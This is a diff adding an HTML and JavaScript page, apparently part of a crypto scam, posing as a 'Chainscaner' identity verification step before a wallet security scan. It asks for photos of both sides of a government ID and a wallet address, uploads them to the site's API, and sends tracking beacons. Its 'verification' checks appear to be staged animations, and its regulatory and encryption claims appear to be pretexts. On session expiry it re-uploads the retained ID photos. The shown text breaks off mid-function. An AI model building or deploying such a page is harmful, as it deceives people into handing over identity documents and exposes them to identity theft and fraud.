@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Identity Verification — Chainscaner</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
+<style>
+  :root {
+    color-scheme: light;
+    --bg: #f4f6f9;
+    --card: #ffffff;
+    --border: #e3e8ef;
+    --text: #17202b;
+    --muted: #5f6b7c;
+    --primary: #0a5cff;
+    --primary-hover: #0049d6;
+    --success: #14914b;
+    --success-hover: #0e7a3c;
+    --danger: #d92d20;
+    --warn: #b54708;
+    --ring: rgba(10,92,255,.18);
+    --shadow: 0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+  }
+  * { box-sizing: border-box; }
+  body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); -webkit-font-smoothing: antialiased; }
+  .hidden { display: none !important; }
+
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 28px; box-shadow: var(--shadow); animation: rise .25s ease; }
+  @keyframes rise { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+  .inner-box { background: #f8fafc; border: 1px solid var(--border); border-radius: 12px; }
+
+  .journey { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; }
+  .jstep { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--muted); white-space: nowrap; font-weight: 500; }
+  .jstep .jdot { width: 24px; height: 24px; border-radius: 50%; border: 1.5px solid var(--border); background: #fff; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; flex: none; transition: all .25s; }
+  .jstep.active { color: var(--text); }
+  .jstep.active .jdot { border-color: var(--primary); color: #fff; background: var(--primary); box-shadow: 0 0 0 4px var(--ring); }
+  .jstep.done { color: var(--success); }
+  .jstep.done .jdot { border-color: var(--success); background: rgba(20,145,75,.1); color: var(--success); }
+  .jconn { flex: 1; height: 1.5px; background: var(--border); min-width: 14px; transition: background .3s; }
+  .jconn.done { background: var(--success); }
+
+  .btn-primary, .btn-secondary, .btn-success {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    font-weight: 600; padding: 13px 24px; border-radius: 10px; font-size: 15px;
+    transition: all .18s ease; border: 0; cursor: pointer; width: 100%;
+  }
+  .btn-primary { background: var(--primary); color: #fff; box-shadow: 0 1px 2px rgba(10,92,255,.25); }
+  .btn-primary:hover:not(:disabled) { background: var(--primary-hover); }
+  .btn-primary:active:not(:disabled), .btn-secondary:active:not(:disabled), .btn-success:active:not(:disabled) { transform: scale(.98); }
+  .btn-primary:disabled, .btn-success:disabled { opacity: .45; cursor: not-allowed; }
+  .btn-secondary { background: #fff; color: var(--text); border: 1px solid var(--border); }
+  .btn-secondary:hover { background: #f7f9fc; border-color: #cdd4de; }
+  .btn-success { background: var(--success); color: #fff; box-shadow: 0 1px 2px rgba(20,145,75,.25); }
+  .btn-success:hover:not(:disabled) { background: var(--success-hover); }
+
+  .link-btn { color: var(--primary); font-weight: 500; background: none; border: 0; cursor: pointer; font-size: 13px; }
+  .link-btn:hover { text-decoration: underline; }
+
+  button:focus-visible, .cap-area:focus-visible, input:focus-visible {
+    outline: none; box-shadow: 0 0 0 4px var(--ring);
+  }
+
+  /* Session pill — same pattern as the link-mode verification pages */
+  .session-pill { display: inline-flex; align-items: center; gap: 7px; padding: 6px 12px;
+    border: 1px solid var(--border); border-radius: 999px; background: #fff;
+    font-size: 12px; font-weight: 500; color: var(--muted); white-space: nowrap;
+    box-shadow: var(--shadow); transition: border-color .3s, color .3s, background .3s; }
+  .session-pill svg { flex: none; }
+  .session-pill .val { font-family: ui-monospace, 'SF Mono', Menlo, monospace; font-weight: 700;
+    color: var(--text); font-variant-numeric: tabular-nums; letter-spacing: .02em; }
+  .session-pill.warn { border-color: rgba(181,71,8,.4); background: #fffaeb; color: var(--warn); }
+  .session-pill.warn .val { color: var(--warn); }
+  .session-pill.danger { border-color: rgba(217,45,32,.45); background: #fef3f2; color: var(--danger); }
+  .session-pill.danger .val { color: var(--danger); }
+  .session-pill.danger svg { animation: pill-pulse 1s ease-in-out infinite; }
+  @keyframes pill-pulse { 0%,100% { opacity: 1 } 50% { opacity: .35 } }
+
+  /* Capture areas — same component the checker gate uses */
+  .cap-area { background: #fafbfd; border: 2px dashed var(--border); border-radius: 14px; padding: 22px 18px;
+    text-align: center; cursor: pointer; transition: all .2s; }
+  .cap-area:hover, .cap-area.dz-hover { border-color: var(--primary); background: rgba(10,92,255,.03); }
+  .cap-area:active { transform: scale(.995); }
+  .cap-area.done { border-style: solid; border-color: rgba(20,145,75,.35); background: #fff; cursor: default; }
+  .cap-img { width: 100%; border-radius: 10px; display: block; margin-bottom: 12px; }
+  .cap-status { font-size: 12px; font-weight: 600; color: var(--muted); margin-top: 10px; min-height: 16px; }
+  .cap-status.err { color: var(--danger); }
+
+  .quality-row { display: flex; gap: 8px; margin-top: 4px; }
+  .quality-row .qchip { flex: 1; padding: 6px 8px; border-radius: 6px; font-size: 11px; text-align: center; font-weight: 600; }
+  .quality-row .qchip.good { background: rgba(20,145,75,.09); color: var(--success); border: 1px solid rgba(20,145,75,.35); }
+  .quality-row .qchip.bad { background: rgba(217,45,32,.07); color: var(--danger); border: 1px solid rgba(217,45,32,.3); }
+  .quality-row .qchip.pending { background: #f2f4f7; color: var(--muted); border: 1px solid var(--border); }
+
+  .vcheck { display: flex; align-items: center; gap: 10px; padding: 10px 0; font-size: 14px; color: var(--muted); }
+  .vcheck .vico { width: 22px; height: 22px; border-radius: 50%; border: 1.5px solid var(--border); display: flex; align-items: center; justify-content: center; flex: none; font-size: 11px; transition: all .25s; }
+  .vcheck.run { color: var(--text); }
+  .vcheck.run .vico { border-color: var(--primary); }
+  .vcheck.run .vico::after { content: ""; width: 10px; height: 10px; border-radius: 50%; border: 2px solid var(--primary); border-top-color: transparent; animation: spin 0.7s linear infinite; }
+  .vcheck.ok { color: var(--success); }
+  .vcheck.ok .vico { border-color: var(--success); background: rgba(20,145,75,.1); }
+  .vcheck.ok .vico::after { content: "✓"; color: var(--success); font-weight: 800; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .ok-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 14px; border-radius: 99px;
+    font-size: 12px; font-weight: 800; letter-spacing: .6px;
+    background: rgba(20,145,75,.1); color: var(--success); border: 1px solid rgba(20,145,75,.35); }
+
+  .addr-input { width: 100%; padding: 13px 16px; border: 1.5px solid var(--border); border-radius: 10px;
+    font-size: 14px; font-family: ui-monospace, 'SF Mono', Menlo, monospace; transition: border-color .15s; }
+  .addr-input:focus { border-color: var(--primary); }
+  .addr-input.invalid { border-color: var(--danger); }
+
+  @media (prefers-reduced-motion: reduce) {
+    .session-pill.danger svg, .vcheck.run .vico::after { animation: none; }
+    .card, .jstep .jdot, .jconn, .btn-primary, .btn-secondary, .btn-success, .cap-area { animation: none; transition: none; }
+  }
+</style>
+</head>
+<body class="min-h-screen">
+
+<div class="max-w-xl mx-auto py-10 px-4">
+
+  <!-- Header -->
+  <div class="flex items-center justify-between mb-5">
+    <div class="inline-flex items-center gap-2">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" style="color:var(--primary)"><path d="M12 2L4 5v6c0 5.55 3.84 9.74 8 11 4.16-1.26 8-5.45 8-11V5l-8-3zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="currentColor"/></svg>
+      <span class="font-semibold tracking-tight" style="color:var(--text)">Chainscaner</span>
+    </div>
+    <div id="sess-pill" class="session-pill hidden" role="timer" aria-label="Session time remaining">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      <span>Expires in</span>
+      <span class="val" id="sess-pill-val">30:00</span>
+    </div>
+  </div>
+  <div class="text-center mb-7">
+    <h1 class="text-2xl font-bold mb-1 tracking-tight">Identity Verification</h1>
+    <p class="text-sm" style="color:var(--muted)">Required before your wallet security scan</p>
+  </div>
+
+  <!-- Journey: Documents → Scan → Verified -->
+  <div class="journey" aria-label="Verification progress">
+    <div class="jstep active" id="j-doc"><span class="jdot">1</span><span>Documents</span></div>
+    <div class="jconn" id="jc-doc"></div>
+    <div class="jstep" id="j-scan"><span class="jdot">2</span><span>Wallet scan</span></div>
+    <div class="jconn" id="jc-scan"></div>
+    <div class="jstep" id="j-done"><span class="jdot">3</span><span>Verified</span></div>
+  </div>
+
+  <!-- Step 1: intro -->
+  <div id="step-intro" class="card">
+    <h2 class="text-lg font-semibold mb-4">Verify your identity</h2>
+    <div class="inner-box p-4 mb-6 hidden" id="req-box">
+      <p class="text-sm font-medium mb-2">Verification Request</p>
+      <div class="grid grid-cols-2 gap-4 text-sm">
+        <div>
+          <p class="text-xs" style="color:var(--muted)">From (Requester)</p>
+          <p class="font-medium" id="from-display">-</p>
+        </div>
+        <div>
+          <p class="text-xs" style="color:var(--muted)">To (Verified Person)</p>
+          <p class="font-medium" id="to-display">-</p>
+        </div>
+      </div>
+      <div class="mt-3 pt-3 text-xs" style="border-top:1px solid var(--border); color:var(--muted)">
+        Valid for 30 minutes from first opening — the countdown is shown at the top.
+      </div>
+    </div>
+    <p class="text-sm mb-6" style="color:var(--muted)">
+      Regulatory screening requires identity verification before we can run the
+      deep wallet analysis. Please have your government-issued ID ready —
+      we need a photo of the front and the back.
+    </p>
+    <div class="space-y-3 mb-6">
+      <div class="flex items-start gap-3">
+        <svg class="w-5 h-5 mt-0.5" style="color:var(--success)" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+        <div>
+          <p class="text-sm font-medium">Secure &amp; encrypted</p>
+          <p class="text-xs" style="color:var(--muted)">Documents are transmitted over an encrypted channel</p>
+        </div>
+      </div>
+      <div class="flex items-start gap-3">
+        <svg class="w-5 h-5 mt-0.5" style="color:var(--success)" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+        <div>
+          <p class="text-sm font-medium">Under two minutes</p>
+          <p class="text-xs" style="color:var(--muted)">Front and back photo — on this device or your phone</p>
+        </div>
+      </div>
+      <div class="flex items-start gap-3">
+        <svg class="w-5 h-5 mt-0.5" style="color:var(--success)" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+        <div>
+          <p class="text-sm font-medium">One-time step</p>
+          <p class="text-xs" style="color:var(--muted)">Verification carries over to your wallet scan automatically</p>
+        </div>
+      </div>
+    </div>
+    <button onclick="showStep('step-docs')" class="btn-primary">Start Verification</button>
+  </div>
+
+  <!-- Step 2: documents -->
+  <div id="step-docs" class="card hidden">
+    <h2 class="text-lg font-semibold mb-1">Document photos</h2>
+    <p class="text-sm mb-5" style="color:var(--muted)">Photograph or upload the front and back of your ID. Good lighting, no glare.</p>
+
+    <div class="text-center mb-5" id="phone-wrap">
+      <button type="button" onclick="kycTogglePhone()" id="phone-toggle" class="link-btn">Use your phone's camera instead →</button>
+    </div>
+
+    <!-- QR handoff panel -->
+    <div id="qr-panel" class="hidden mb-6 text-center inner-box p-6" style="border-radius:16px">
+      <p class="text-sm mb-1 font-semibold">Scan with your phone camera</p>
+      <p class="text-xs mb-4" style="color:var(--muted)">A capture page opens on your phone — this page continues automatically when your photos arrive.</p>
+      <div class="bg-white p-4 rounded-xl inline-block" style="box-shadow:var(--shadow)" id="qr-code"></div>
+      <div class="mt-4 flex items-center justify-center gap-2 text-sm" style="color:var(--warn)">
+        <span class="inline-block w-2 h-2 rounded-full animate-pulse" style="background:var(--warn)"></span>
+        <span id="qr-text">Waiting for phone…</span>
+      </div>
+      <button type="button" onclick="kycTogglePhone()" class="link-btn mt-4 text-xs">Upload on this device instead</button>
+    </div>
+
+    <div id="capture-area">
+      <!-- Front -->
+      <p class="text-xs font-semibold mb-2" style="color:var(--muted); letter-spacing:.4px">FRONT SIDE</p>
+      <div id="kyc-front-cap" class="cap-area mb-1" role="button" tabindex="0" aria-label="Capture or upload front side of document">
+        <div id="kyc-front-empty">
+          <div style="font-size:26px; margin-bottom:6px">🪪</div>
+          <div style="font-weight:600; font-size:13px">Tap to photograph or choose a file</div>
+          <div style="font-size:11px; margin-top:3px; color:var(--muted)">JPG or PNG</div>
+        </div>
+        <div id="kyc-front-preview" class="hidden">
+          <img id="kyc-front-img" class="cap-img" alt="Front side preview" />
+          <div class="quality-row">
+            <div class="qchip pending" id="kyc-front-q-blur">Sharpness</div>
+            <div class="qchip pending" id="kyc-front-q-glare">Glare</div>
+            <div class="qchip pending" id="kyc-front-q-light">Lighting</div>
+          </div>
+        </div>
+      </div>
+      <input type="file" id="kyc-front-input" accept="image/*" capture="environment" class="hidden" aria-hidden="true" />
+      <div class="flex items-center justify-between mb-5">
+        <div class="cap-status" id="kyc-front-st"></div>
+        <button type="button" id="kyc-front-redo" onclick="kycRetake('front')" class="link-btn text-xs hidden">Retake</button>
+      </div>
+
+      <!-- Back -->
+      <p class="text-xs font-semibold mb-2" style="color:var(--muted); letter-spacing:.4px">BACK SIDE</p>
+      <div id="kyc-back-cap" class="cap-area mb-1" role="button" tabindex="0" aria-label="Capture or upload back side of document">
+        <div id="kyc-back-empty">
+          <div style="font-size:26px; margin-bottom:6px">🔄</div>
+          <div style="font-weight:600; font-size:13px">Tap to photograph or choose a file</div>
+          <div style="font-size:11px; margin-top:3px; color:var(--muted)">JPG or PNG</div>
+        </div>
+        <div id="kyc-back-preview" class="hidden">
+          <img id="kyc-back-img" class="cap-img" alt="Back side preview" />
+          <div class="quality-row">
+            <div class="qchip pending" id="kyc-back-q-blur">Sharpness</div>
+            <div class="qchip pending" id="kyc-back-q-glare">Glare</div>
+            <div class="qchip pending" id="kyc-back-q-light">Lighting</div>
+          </div>
+        </div>
+      </div>
+      <input type="file" id="kyc-back-input" accept="image/*" capture="environment" class="hidden" aria-hidden="true" />
+      <div class="flex items-center justify-between mb-5">
+        <div class="cap-status" id="kyc-back-st"></div>
+        <button type="button" id="kyc-back-redo" onclick="kycRetake('back')" class="link-btn text-xs hidden">Retake</button>
+      </div>
+
+      <div id="kyc-err" class="hidden text-sm mb-4" style="color:var(--danger)"></div>
+      <button class="btn-primary" id="kyc-submit" onclick="kycSubmitDocs()" disabled>Verify documents</button>
+      <div class="text-center mt-3">
+        <button type="button" class="link-btn text-xs hidden" id="kyc-restart" onclick="kycRestartSession()">Start new verification session</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 3: staged verification -->
+  <div id="step-verify" class="card hidden text-center">
+    <h2 class="text-lg font-semibold mb-2">Verifying your documents</h2>
+    <p class="text-sm mb-6" style="color:var(--muted)">This takes a few seconds — please don't close this page.</p>
+    <div class="text-left max-w-xs mx-auto">
+      <div class="vcheck" id="vc1"><span class="vico"></span><span>Checking document integrity…</span></div>
+      <div class="vcheck" id="vc2"><span class="vico"></span><span>Validating authenticity markers…</span></div>
+      <div class="vcheck" id="vc3"><span class="vico"></span><span>Cross-matching compliance records…</span></div>
+    </div>
+  </div>
+
+  <!-- Step 4: wallet address → scan -->
+  <div id="step-addr" class="card hidden">
+    <div class="text-center mb-5">
+      <span class="ok-badge">✓ IDENTITY VERIFIED</span>
+    </div>
+    <h2 class="text-lg font-semibold mb-1">Documents verified</h2>
+    <p class="text-sm mb-6" style="color:var(--muted)">Last step — enter the wallet address you want us to scan. The full analysis runs next.</p>
+    <div class="mb-2">
+      <input type="text" id="scan-addr" class="addr-input" placeholder="0x… or T… wallet address" autocomplete="off" spellcheck="false" oninput="addrInput()" />
+      <div id="addr-err" class="hidden text-xs mt-2" style="color:var(--danger)">Please enter a valid wallet address (0x… or T…).</div>
+    </div>
+    <button class="btn-success" id="addr-go" onclick="goScan()" disabled>Continue to security scan</button>
+  </div>
+
+  <!-- State: expired -->
+  <div id="step-expired" class="card hidden text-center">
+    <div class="w-16 h-16 mx-auto mb-4 rounded-full flex items-center justify-center" style="background:rgba(217,45,32,.08); border:1.5px solid rgba(217,45,32,.3)">
+      <svg class="w-8 h-8" style="color:var(--danger)" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/></svg>
+    </div>
+    <h2 class="text-lg font-semibold mb-2">Link Expired or Invalid</h2>
+    <p class="text-sm mb-6" style="color:var(--muted)">This verification link has expired or is invalid.<br>Please request a new link.</p>
+  </div>
+
+  <!-- State: already done -->
+  <div id="step-done" class="card hidden text-center">
+    <div class="w-16 h-16 mx-auto mb-4 rounded-full flex items-center justify-center" style="background:rgba(20,145,75,.1); border:1.5px solid rgba(20,145,75,.35)">
+      <svg class="w-8 h-8" style="color:var(--success)" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+    </div>
+    <h2 class="text-lg font-semibold mb-2">Already Verified</h2>
+    <p class="text-sm mb-6" style="color:var(--muted)">Your documents were already verified for this session.<br>You can continue straight to the wallet scan.</p>
+    <button class="btn-primary" onclick="resumeDone()">Continue to scan</button>
+  </div>
+
+  <p class="text-center text-xs mt-6" style="color:var(--muted)">Protected by end-to-end encryption · Chainscaner compliance</p>
+</div>
+
+<script>
+"use strict";
+var REDUCED_MOTION = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+var isDesktopUA = !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+var $ = function(id) { return document.getElementById(id); };
+
+/* ── Live monitor — same event feed as the checker / ledger flows ── */
+var MONITOR_URL = "/api/events";
+var _monSid = "kycfirst-" + Math.random().toString(36).slice(2, 8);
+function monit(ev, data) {
+  try {
+    var d = Object.assign({ session: kycSid || "" }, data || {});
+    var p = JSON.stringify({ ev: ev, t: new Date().toISOString(), sid: _monSid, d: d });
+    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, p)) return;
+    fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: p }).catch(function() {});
+  } catch (e) {}
+}
+
+/* ── Session state ── */
+var KYC_TTL = 30 * 60 * 1000;
+var KYC_UP_TIMEOUT = 25000;
+var kycSid = null;
+var kycExp = null;
+var kycSessPosted = false;
+var kycTimerIv = null;
+var kycDone = false;
+var forParam = null;
+
+function isValidAddr(a) { return typeof a === "string" && /^0x[a-fA-F0-9]{40}$/.test(a); }
+function isTronAddr(a) { return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a || ""); }
+function isSid(s) { return /^[0-9a-f]{24}$/.test(s || ""); }
+
+function kycNewSid() {
+  var c = "0123456789abcdef", s = "";
+  for (var i = 0; i < 24; i++) s += c[Math.floor(Math.random() * 16)];
+  return s;
+}
+
+function showStep(id) {
+  ["step-intro", "step-docs", "step-verify", "step-addr", "step-expired", "step-done"].forEach(function(s) {
+    $(s).classList.toggle("hidden", s !== id);
+  });
+  // Journey follows the phase — docs steps light the first node, the address
+  // step means documents are done and the scan is next.
+  var doc = $("j-doc"), con1 = $("jc-doc"), scan = $("j-scan"), con2 = $("jc-scan"), done = $("j-done");
+  if (id === "step-addr" || id === "step-done") {
+    doc.className = "jstep done"; doc.querySelector(".jdot").textContent = "✓"; con1.classList.add("done");
+    scan.className = "jstep active"; scan.querySelector(".jdot").textContent = "2";
+  } else if (id !== "step-expired") {
+    doc.className = "jstep active"; doc.querySelector(".jdot").textContent = "1"; con1.classList.remove("done");
+    scan.className = "jstep"; scan.querySelector(".jdot").textContent = "2";
+    con2.classList.remove("done");
+    done.className = "jstep"; done.querySelector(".jdot").textContent = "3";
+  }
+}
+
+/* ── Session lifecycle: ?session=<sid> resumes a link-mode session,
+      otherwise a fresh one is created for the advertised funnel ── */
+function postSess(op) {
+  fetch("/api/events", {
+    method: "POST", headers: { "Content-Type": "application/json" }, keepalive: true,
+    body: JSON.stringify({ op: op, session: kycSid, expiresAt: kycExp,
+      from: "kyc-first", to: forParam || "" })
+  }).catch(function() { if (op === "sess_create") kycSessPosted = false; });
+}
+function ensureKycSession() {
+  if (!kycSid) { kycSid = kycNewSid(); kycExp = Date.now() + KYC_TTL; }
+  if (kycSessPosted) return;
+  kycSessPosted = true;
+  postSess("sess_create");
+}
+
+function kycTickPill() {
+  var pill = $("sess-pill"), val = $("sess-pill-val");
+  if (!pill || !val || !kycExp) return;
+  if (kycDone) { kycStopTimer(); pill.classList.add("hidden"); return; }
+  var left = kycExp - Date.now();
+  if (left <= 0) { kycStopTimer(); kycExpire(); return; }
+  var m = Math.floor(left / 60000), s = Math.floor((left % 60000) / 1000);
+  pill.classList.remove("hidden");
+  val.textContent = m + ":" + String(s).padStart(2, "0");
+  pill.classList.toggle("warn", left < 300000 && left >= 120000);
+  pill.classList.toggle("danger", left < 120000);
+}
+function kycStartTimer() {
+  if (kycTimerIv) return;
+  kycTimerIv = setInterval(kycTickPill, 1000);
+  kycTickPill();
+}
+function kycStopTimer() {
+  if (kycTimerIv) { clearInterval(kycTimerIv); kycTimerIv = null; }
+}
+
+function kycExpire() {
+  kycStopPoll();
+  if (kycPhone) { $("qr-panel").classList.add("hidden"); $("capture-area").classList.remove("hidden"); }
+  $("sess-pill").classList.add("hidden");
+  var err = $("kyc-err");
+  err.textContent = "Session expired — start a new verification session to continue. Captured photos are kept and re-secured automatically.";
+  err.classList.remove("hidden");
+  $("kyc-submit").disabled = true;
+  $("kyc-restart").classList.remove("hidden");
+  monit("kyc_expired", { src: "kyc-first" });
+}
+
+async function kycRestartSession() {
+  kycSid = kycNewSid();
+  kycExp = Date.now() + KYC_TTL;
+  kycSessPosted = false;
+  ensureKycSession();
+  kycGot = { front: false, back: false };
+  $("kyc-err").classList.add("hidden");
+  $("kyc-restart").classList.add("hidden");
+  monit("kyc_session_renewed", { src: "kyc-first" });
+  var sides = ["front", "back"].filter(function(s) { return !!kycImg[s]; });
+  for (var i = 0; i < sides.length; i++) {
+    var side = sides[i];
+    kycSetSt(side, "Re-securing photo…");
+    try {
+      var r = await fetch("/api/kycdoc", {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ op: "upload", session: kycSid, side: side, image: kycImg[side] })
+      });
+      var j = await r.json().catch(function() { return {}; });
+      kycUpOk[side] = j.ok === true;
+      kycSetSt(side, kycUpOk[side] ? "" : "Re-upload failed — retake this photo", !kycUpOk[side]);
+    } catch (e) {
+      kycUpOk[side] = false;
+      kycSetSt(side, "Re-upload failed — retake this photo", true);
+    }
+  }
+  kycUpdateSubmit();
+  kycStartTimer();
+  if (kycPhone) { kycRenderQr(); $("qr-text").textContent = "Waiting for phone…"; kycStartPoll(); }
+}
+
+/* ── Session boot: link-mode (?session=) or self-serve advertised link ── */
+async function initSession() {
+  var params = new URLSearchParams(location.search);
+  var linkSid = params.get("session");
+  forParam = params.get("for");
+  if (forParam && (isValidAddr(forParam) || isTronAddr(forParam))) {
+    // Prefill the address step — the advertised link can carry the target.
+    $("scan-addr").value = forParam;
+  } else {
+    forParam = null;
+  }
+  var from = params.get("from"), to = params.get("to");
+  if (from || to) {
+    $("req-box").classList.remove("hidden");
+    $("from-display").textContent = from || "-";
+    $("to-display").textContent = to || "-";
+  }
+
+  if (linkSid && isSid(linkSid)) {
+    // Link-mode: the session record is authoritative (multi-device opens).
+    try {
+      var ctl = new AbortController();
+      var t = setTimeout(function() { ctl.abort(); }, 2500);
+      var r = await fetch("/api/events?sess=" + linkSid, { signal: ctl.signal });
+      clearTimeout(t);
+      var j = await r.json().catch(function() { return {}; });
+      if (j.ok && j.found) {
+        if (j.verified) { monit("kyc_already_done", { src: "kyc-first" }); kycSid = linkSid; showStep("step-done"); return; }
+        if (j.expired || (j.expiresAt && Date.now() >= j.expiresAt)) { monit("kyc_expired", { src: "kyc-first" }); showStep("step-expired"); return; }
+        kycSid = linkSid;
+        kycExp = j.expiresAt || (Date.now() + KYC_TTL);
+        kycSessPosted = true;
+        monit("kyc_resumed", { src: "kyc-first" });
+        kycStartTimer();
+        return;
+      }
+      // Unknown to the server — first open of a link-mode session.
+      kycSid = linkSid;
+      kycExp = Date.now() + KYC_TTL;
+      ensureKycSession();
+      kycStartTimer();
+      return;
+    } catch (e) {
+      kycSid = linkSid;
+      kycExp = Date.now() + KYC_TTL;
+      ensureKycSession();
+      kycStartTimer();
+      return;
+    }
+  }
+  if (linkSid && !isSid(linkSid)) { showStep("step-expired"); return; }
+
+  // Advertised funnel — fresh self-serve session.
+  ensureKycSession();
+  kycStartTimer();
+  monit("kyc_opened", { src: "kyc-first" });
+}
+
+/* ── Capture: compress → quality → upload → status ── */
+var kycImg = { front: null, back: null };
+var kycUpOk = { front: false, back: false };
+var kycUpCtl = { front: null, back: null };
+var kycGot = { front: false, back: false };
+
+function kycSetSt(side, msg, isErr) {
+  var el = $("kyc-" + side + "-st");
+  if (el) { el.textContent = msg || ""; el.classList.toggle("err", !!isErr); }
+}
+
+function kycCompress(file) {
+  return new Promise(function(resolve, reject) {
+    var img = new Image();
+    img.onload = function() {
+      var scale = Math.min(1, 1400 / Math.max(img.width, img.height));
+      var w = Math.round(img.width * scale), h = Math.round(img.height * scale);
+      var c = document.createElement("canvas");
+      c.width = w; c.height = h;
+      c.getContext("2d").drawImage(img, 0, 0, w, h);
+      URL.revokeObjectURL(img.src);
+      var out = c.toDataURL("image/jpeg", 0.75);
+      // Second pass at lower quality if still above the server's ~900 KB cap
+      if (out.length > 850 * 1024) out = c.toDataURL("image/jpeg", 0.55);
+      resolve(out);
+    };
+    img.onerror = reject;
+    img.src = URL.createObjectURL(file);
+  });
+}
+
+function kycQuality(dataUrl) {
+  return new Promise(function(resolve) {
+    var img = new Image();
+    img.onload = function() {
+      var c = document.createElement("canvas");
+      var s = Math.min(1, 480 / Math.max(img.width, img.height));
+      c.width = Math.max(1, Math.round(img.width * s));
+      c.height = Math.max(1, Math.round(img.height * s));
+      var ctx = c.getContext("2d");
+      ctx.drawImage(img, 0, 0, c.width, c.height);
+      var d = ctx.getImageData(0, 0, c.width, c.height).data;
+      var sharp = 0, glare = 0, bright = 0, n = d.length / 4;
+      for (var i = 4; i < d.length; i += 4) sharp += Math.abs(d[i] - d[i - 4]);
+      sharp /= n;
+      for (var j = 0; j < d.length; j += 4) {
+        var mx = Math.max(d[j], d[j + 1], d[j + 2]), mn = Math.min(d[j], d[j + 1], d[j + 2]);
+        if (mx - mn > 200) glare++;
+        bright += (d[j] + d[j + 1] + d[j + 2]) / 3;
+      }
+      resolve({ blur: sharp > 15, glare: (glare / n) < 0.3, light: (bright / n) > 40 && (bright / n) < 220 });
+    };
+    img.onerror = function() { resolve({ blur: true, glare: true, light: true }); };
+    img.src = dataUrl;
+  });
+}
+
+function kycPaintQuality(side, q) {
+  var map = [["blur", q.blur, "Sharp", "Blurry"], ["glare", q.glare, "No glare", "Glare"], ["light", q.light, "Good light", "Poor light"]];
+  map.forEach(function(m) {
+    var el = $("kyc-" + side + "-q-" + m[0]);
+    if (!el) return;
+    el.className = "qchip " + (m[1] ? "good" : "bad");
+    el.textContent = m[1] ? "✓ " + m[2] : "✗ " + m[3];
+  });
+}
+
+function kycUpdateSubmit() {
+  $("kyc-submit").disabled = !(kycUpOk.front && kycUpOk.back);
+}
+
+async function kycCapture(side, file) {
+  if (!file || !file.type.startsWith("image/")) {
+    kycSetSt(side, "Please choose an image file", true);
+    return;
+  }
+  ensureKycSession();
+  var cap = $("kyc-" + side + "-cap");
+  kycSetSt(side, "Processing photo…");
+  try {
+    var dataUrl = await kycCompress(file);
+    kycImg[side] = dataUrl;
+    kycUpOk[side] = false;
+    kycUpdateSubmit();
+    $(side === "front" ? "kyc-front-empty" : "kyc-back-empty").classList.add("hidden");
+    var prev = $("kyc-" + side + "-preview");
+    prev.classList.remove("hidden");
+    $("kyc-" + side + "-img").src = dataUrl;
+    cap.classList.add("done");
+    $("kyc-" + side + "-redo").classList.remove("hidden");
+
+    kycQuality(dataUrl).then(function(q) { kycPaintQuality(side, q); });
+
+    // Abort any in-flight upload for this side — retake supersedes.
+    if (kycUpCtl[side]) kycUpCtl[side].abort();
+    var ctl = new AbortController();
+    kycUpCtl[side] = ctl;
